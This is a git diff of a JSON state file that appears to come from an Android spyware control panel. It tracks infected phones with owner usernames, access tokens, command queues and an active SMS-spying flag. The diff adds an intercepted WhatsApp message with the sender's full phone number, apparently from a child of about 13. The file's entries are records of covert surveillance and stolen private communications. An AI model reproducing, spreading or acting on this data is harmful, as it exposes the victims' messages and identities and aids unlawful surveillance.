@@ -36,7 +36,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "729a4fc8ab7614c8892066df29eb7c03",
-    "lastSeen": 1775901993884,
+    "lastSeen": 1775902009017,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T09:04:13.167Z",
@@ -52,6 +52,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "+62 882-0034-07371",
+        "content": "Bang boleh join gak bang \nKan udah mau 13th",
+        "time": "11/04 17:06",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775902010560
+      },
       {
         "appName": "WhatsApp",
         "sender": "+62 882-0034-07371",
@@ -165,7 +173,7 @@
     "deviceName": "HP-LOCK-236E",
     "ownerUsername": "Riz99",
     "token": "25f27c309061b42c3e6310cc706ba952",
-    "lastSeen": 1775901994584,
+    "lastSeen": 1775902009703,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T09:23:23.787Z",
@@ -197,7 +205,7 @@
     "deviceName": "HP-LOCK-F00B",
     "ownerUsername": "Riz99",
     "token": "e13e997b60c0fcca110bf105c3d2f904",
-    "lastSeen": 1775901992824,
+    "lastSeen": 1775902008368,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T09:39:58.599Z",
